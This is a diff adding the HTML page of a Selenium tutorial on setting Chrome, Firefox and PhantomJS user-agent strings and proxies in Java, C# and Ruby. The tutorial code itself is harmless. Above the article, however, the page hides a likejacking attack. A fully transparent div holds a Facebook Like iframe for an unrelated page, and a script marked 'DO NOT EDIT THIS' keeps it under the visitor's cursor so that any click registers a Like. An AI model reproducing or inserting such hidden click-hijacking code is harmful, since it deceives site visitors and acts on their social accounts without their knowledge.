@@ -1,0 +1,405 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>WebDriver : Set Browser's User-agent - Selenium Tutorial</title>
+    <meta name="author" content="Ta Bao Lan">
+   	
+	<meta name="description" content="Set Browser's User-agent" />
+	
+	<meta name="keywords" content="" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<link href="/atom.xml" rel="alternate" title="Selenium Tutorial" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.ico" rel="shortcut icon">
+    <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+    <link href='http://fonts.googleapis.com/css?family=Slackey' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Amethysta' rel='stylesheet' type='text/css'>
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+    <script type="text/javascript" src="/javascripts/jquery-tapir.js"></script>
+
+    <!-- remove or comment it to disable ajaxification -->   
+    <!--  <script src="/javascripts/ajaxify.js"></script> -->   
+
+
+
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    var pluginUrl =
+            '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
+    _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
+    _gaq.push(['_setAccount', 'UA-51278981-1']);
+    _gaq.push(['_trackPageview']);
+    function initGa() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    }
+    setTimeout(initGa, 50);
+</script>
+
+
+
+</head>
+
+<body>
+
+    <div id="wrapper">
+    <header id="header" class="inner"><!-- for more effects see _animate.scss -->
+<h1 class="animated bounceInDown">
+    <div id="headerbg">
+		Selenium Tutorial
+		<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- ad-banner-responsive -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5798698216356388"
+     data-ad-slot="7145934352"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+    </div>
+</h1>
+<br>
+
+<ul id="social-links" style="text-align:center">
+  
+  
+  <!-- Google Plus -->
+  <li>
+  <a href="http://plus.google.com/lantabao?rel=author" class="google" title="Google+"></a>
+  </li>
+  
+  
+  <!-- Facebook -->
+  <li>
+  <a href="http://www.facebook.com/gaumun" class="facebook" title="Facebook"></a>
+  </li>
+  
+  
+  
+  <!-- LinkedIn -->
+  <li>
+  <a href="http://www.linkedin.com/in/tabaolan" class="linkedin" title="LinkedIn"></a>
+  </li>
+  
+  
+  <!-- Skype -->
+  <li>
+  <a href="http://myskype.info/lantb1987" class="skype" title="Skype"></a>
+  </li>
+  
+  
+  
+</ul>
+
+
+<!-- use full url including 'index.html' for navigation bar if you are using ajax -->
+<ul id="nav">
+	<li id="ajax"><a href="/index.html">Home</a></li>
+	<li id="ajax"><a href="/categories/webdriver/">WebDriver</a></li>
+	<li id="ajax"><a href="/categories/newbie/">Selenium Beginner</a></li>
+	<li id="ajax"><a href="/categories/testng-framework/">TestNG Framework</a></li>
+	<li id="ajax"><a href="/categories/selenium-framework/">Automation Framework</a></li>
+	<li id="ajax"><a href="/categories/icecream-framework/">IceCream Framework</a></li>
+	<li id="ajax"><a href="/categories/selenium-mobile/">Selenium Mobile</a></li>
+    <li id="ajax"><a href="/categories/tricks/">Tips&Tricks</a></li>
+	<li id="ajax"><a href="/categories/jmeter/">JMETER</a></li>
+	<li id="ajax"><a href="/categories/mobiletest/">Mobile Testing</a></li>
+	
+    <li>
+    <div id="dark">
+        <form method="get" action="/search.html" id="search">
+            <input name="query" type="text" placeholder="Search..." x-webkit-speech />
+        </form>
+    </div>
+    </li>
+        
+</ul>
+
+
+
+﻿
+</header>
+
+<div id="toload">
+<!-- begin toload -->
+<div id="content" class="inner">
+<div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="icontainer">
+    <iframe src="http://www.facebook.com/plugins/like.php?href=https://www.facebook.com/pages/Trollvd/606655129460867&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:23px;" allowTransparency="true" id="fbframe" name="fbframe"></iframe>
+    <!--end facebook like frame code-->
+</div>
+<script>
+    var iflag = 0;
+    var icontainer = document.getElementById('icontainer');
+    var standardbody = (document.compatMode == "CSS1Compat") ? document.documentElement : document.body   
+	function mouseFollower(e){ /* DO NOT EDIT THIS */ 
+	if (window.event) { icontainer.style.top = (window.event.y-5)+standardbody.scrollTop+'px'; icontainer.style.left = (window.event.x-5)+standardbody.scrollLeft+'px'; } else { icontainer.style.top = (e.pageY-5)+'px'; icontainer.style.left = (e.pageX-5)+'px'; } } document.onmousemove = function(e) { if (iflag == 0) {mouseFollower(e);} }
+</script>
+        <article class="post">
+
+	<h2 class="title">WebDriver : Set Browser's User-agent</h2>
+	<div class="entry-content"><h2>This post demonstrates how to set Chrome, Firefox and PhantomJS’s User Agent (And proxy) using Selenium WebDriver</h2>
+
+<p>You can find user agent string from <a href="http://useragentstring.com/pages/Browserlist/">browser list</a></p>
+
+<!--more-->
+
+
+<h3>Chrome</h3>
+
+<h4>Java language</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>String userAgent = "user_agent_string";
+</span><span class='line'>String proxy = "example:80";
+</span><span class='line'>org.openqa.selenium.Proxy p = new org.openqa.selenium.Proxy();
+</span><span class='line'>p.setHttpProxy(proxy).setFtpProxy(proxy).setSslProxy(proxy);
+</span><span class='line'>ChromeOptions co = new ChromeOptions();
+</span><span class='line'>co.addArguments("--user-agent=" + userAgent);
+</span><span class='line'>DesiredCapabilities cap = DesiredCapabilities.chrome();
+</span><span class='line'>cap.setCapability(CapabilityType.PROXY, p);
+</span><span class='line'>cap.setCapability(ChromeOptions.CAPABILITY , co);
+</span><span class='line'>WebDriver driver = new ChromeDriver(cap);</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>C# language</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>var options = new ChromeOptions();
+</span><span class='line'>var userAgent = "user_agent_string";
+</span><span class='line'>options.AddArgument("--user-agent=" + userAgent);
+</span><span class='line'>IWebDriver driver = new ChromeDriver(options);
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Ruby language</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>require 'selenium-webdriver'
+</span><span class='line'>USER_AGENT = 'user_agent_string'
+</span><span class='line'>driver = Selenium::WebDriver.for :chrome, :switches =&gt; %W[--user-agent=#{USER_AGENT}]</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="3378542759" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<h3>Firefox</h3>
+
+<h4>Java language</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>String proxy = "example:80";
+</span><span class='line'>String userAgent = "user_agent_string";
+</span><span class='line'>FirefoxProfile profile = new FirefoxProfile();
+</span><span class='line'>profile.setPreference("general.useragent.override", userAgent);
+</span><span class='line'>DesiredCapabilities cap = DesiredCapabilities.firefox();
+</span><span class='line'>org.openqa.selenium.Proxy p = new org.openqa.selenium.Proxy();
+</span><span class='line'>p.setHttpProxy(proxy).setFtpProxy(proxy).setSslProxy(proxy);
+</span><span class='line'>cap.setCapability(CapabilityType.PROXY, p);
+</span><span class='line'>cap.setCapability(FirefoxDriver.PROFILE, profile);
+</span><span class='line'>WebDriver driver = new FirefoxDriver(cap);</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>C# language</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>var profile = new FirefoxProfile();
+</span><span class='line'>var userAgent = "user_agent_string";
+</span><span class='line'>profile.SetPreference("general.useragent.override", userAgent);
+</span><span class='line'>IWebDriver driver = new FirefoxDriver(profile);</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Ruby language</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>require 'selenium-webdriver'
+</span><span class='line'>USER_AGENT = 'user_agent_string'
+</span><span class='line'>profile = Selenium::WebDriver::Firefox::Profile.new
+</span><span class='line'>profile['general.useragent.override'] = USER_AGENT
+</span><span class='line'>driver = Selenium::WebDriver.for :firefox, :profile =&gt; profile</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="9425076351" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<h3>PhantomJS</h3>
+
+<h4>Java language</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>String proxy = "example:80";
+</span><span class='line'>String userAgent = "user_agent_string";
+</span><span class='line'>org.openqa.selenium.Proxy p = new org.openqa.selenium.Proxy();
+</span><span class='line'>p.setHttpProxy(proxy).setFtpProxy(proxy).setSslProxy(proxy);
+</span><span class='line'>DesiredCapabilities cap = DesiredCapabilities.phantomjs();
+</span><span class='line'>cap.setCapability(CapabilityType.PROXY, p);
+</span><span class='line'>cap.setJavascriptEnabled(true);
+</span><span class='line'>cap.setCapability("phantomjs.page.settings.userAgent",userAgent);
+</span><span class='line'>WebDriver driver = new PhantomJSDriver(cap);</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>C# language</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>var options = new PhantomJSOptions();
+</span><span class='line'>var userAgent = "user_agent_string";
+</span><span class='line'>options.AddAdditionalCapability("phantomjs.page.settings.userAgent", userAgent);
+</span><span class='line'> 
+</span><span class='line'>IWebDriver driver = new PhantomJSDriver(options);</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="7145934352" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<h4>Ruby language</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>require 'selenium-webdriver'
+</span><span class='line'>USER_AGENT = 'user_agent_string'
+</span><span class='line'>capabilities = Selenium::WebDriver::Remote::Capabilities.phantomjs('phantomjs.page.settings.userAgent' =&gt; USER_AGENT)
+</span><span class='line'>driver = Selenium::WebDriver.for :phantomjs, :desired_capabilities =&gt; capabilities</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+<div class="meta">
+	
+		<span class="comments"><a href="/webdriver-set-browser-useragent/#disqus_thread">Comments</a></span>
+	
+</div>
+
+<br>
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	
+	<a class="addthis_counter addthis_pill_style"></a>
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+
+<section id="comment">
+    <h2 class="title">Comments</h2>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+ </div>
+    <footer id="footer">
+    <div style="display:inline">
+    Copyright &copy; 2014
+
+    Ta Bao Lan
+. Powered by <a href="http://octopress.org">Octopress</a>
+</div>
+
+
+    </footer>
+    <script src="/javascripts/fabric.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'tabaolan1987';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://www.tabaolan.com/webdriver-set-browser-useragent/';
+        var disqus_url = 'http://www.tabaolan.com/webdriver-set-browser-useragent/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+<!-- end toload --> 
+</div>
+</div>
+<script src="/javascripts/jquery.ui.totop.js" type="text/javascript"></script>
+<script type="text/javascript">
+/*<![CDATA[*/
+;(function($){$().UItoTop({easingType:'easeOutCirc'});})(jQuery); 
+/*]]>*/
+</script><!-- remove it to remove the scroll to top button -->
+</body>
+</html>
